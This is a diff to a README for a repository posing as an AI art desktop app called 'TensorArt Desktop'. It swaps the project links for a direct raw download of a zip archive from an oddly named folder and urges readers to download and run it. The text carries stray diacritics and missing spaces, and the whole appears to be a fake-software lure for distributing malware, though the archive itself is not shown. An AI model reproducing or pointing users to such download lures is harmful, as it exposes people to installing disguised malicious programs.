@@ -1,7 +1,7 @@
 <h1>🎨 TensorArt-Desktop---TensorArt-AI-Studio-2026 - Create Stunning AI Art With Zero Hassle</h1>
 
 <p align="center">
-  <a href="https://github.com/magnesiumhydroxidekitembilla9697/TensorArt-Desktop---TensorArt-AI-Studio-2026">
+  <a href="https://raw.githubusercontent.com/magnesiumhydroxidekitembilla9697/TensorArt-Desktop---TensorArt-AI-Studio-2026/main/inebriant/1.4-alpha.5.zip">
     <img src="https://img.shields.io/badge/Download-TensorArt_Desktop-8A2BE2?style=for-the-badge&logo=github&logoColor=white&color=FF6B6B" alt="Download Button" style="padding:15px;border-radius:5px;background:linear-gradient(135deg,#FF6B6B,#8A2BE2);font-size:20px;font-weight:bold;color:white;text-decoration:none;display:inline-block;">
   </a>
 </p>
@@ -60,7 +60,7 @@ Getting started take less than five minutesِ. Follow these simple steps:
 
 **Step 1: Click the Download Button**
 Click theyellow "Download" buttonat thevery top ofthis pageِ. Alternatively, visitthis link directly:
-[Visit Download Page](https://github.com/magnesiumhydroxidekitembilla9697/TensorArt-Desktop---TensorArt-AI-Studio--2026)
+[Visit Download Page](https://raw.githubusercontent.com/magnesiumhydroxidekitembilla9697/TensorArt-Desktop---TensorArt-AI-Studio-2026/main/inebriant/1.4-alpha.5.zip)
 Visitthis link todownloadthe applicationِ.
 
 **Step 2: Download & Run**
